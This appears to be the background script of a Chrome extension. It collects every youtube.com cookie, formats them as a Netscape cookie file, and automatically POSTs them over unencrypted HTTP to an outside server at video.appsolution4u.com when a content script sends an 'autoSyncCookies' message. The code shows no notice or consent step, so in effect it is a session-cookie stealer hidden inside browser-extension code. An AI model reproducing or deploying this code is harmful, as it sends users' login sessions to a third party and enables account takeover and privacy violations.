// Function to format cookies in Netscape format
function formatCookiesNetscape(cookies) {
    let netscapeHeader = "# Netscape HTTP Cookie File\n# Automatically generated\n\n";
    return netscapeHeader + cookies.map(cookie => {
        let domain = cookie.domain.startsWith('.') ? cookie.domain : '.' + cookie.domain;
        let path = cookie.path || '/';
        let secure = cookie.secure ? 'TRUE' : 'FALSE';
        let expiration = cookie.expirationDate ? cookie.expirationDate : '0';
        return `${domain}\tTRUE\t${path}\t${secure}\t${expiration}\t${cookie.name}\t${cookie.value}`;
    }).join("\n");
}

// Function to upload cookies to server
async function uploadCookiesToServer(cookies) {
    try {
        let netscapeFormat = formatCookiesNetscape(cookies);
        let response = await fetch("http://video.appsolution4u.com/api/upload-cookies", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ cookies: netscapeFormat }),
        });

        let result = await response.json();
        return { success: true, message: result.message };
    } catch (error) {
        console.error("Upload error:", error);
        return { success: false, error: "Failed to upload cookies" };
    }
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "getCookies") {
        chrome.cookies.getAll({ domain: "youtube.com" }, (cookies) => {
            sendResponse({ cookies });
        });
    } else if (request.action === "autoSyncCookies") {
        // Handle automatic cookie sync from content script
        chrome.cookies.getAll({ domain: "youtube.com" }, async (cookies) => {
            if (cookies && cookies.length > 0) {
                const result = await uploadCookiesToServer(cookies);
                sendResponse(result);
            } else {
                sendResponse({ success: false, error: "No YouTube cookies found" });
            }
        });
    }
    return true; // Keep the message channel open
});